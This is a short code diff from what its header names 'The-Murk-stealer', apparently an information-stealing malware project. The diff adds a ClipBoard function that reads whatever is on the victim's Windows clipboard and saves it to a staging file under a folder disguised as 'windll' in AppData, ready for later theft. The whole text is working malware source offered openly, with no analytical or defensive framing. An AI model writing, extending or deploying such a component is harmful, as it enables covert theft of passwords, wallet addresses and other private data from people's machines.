@@ -10,7 +10,17 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from scripts.header import Main
+import win32clipboard
+import os
 
-if __name__ == "__main__":
-    Main()
+def ClipBoard():
+    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
+    try:
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData()
+    except Exception as e:
+        data =  "none"
+    finally:
+        win32clipboard.CloseClipboard()
+        with open(pathtofile+"\\System\\clipboard.txt", 'w', encoding='UTF-8') as f:
+            f.write(data)
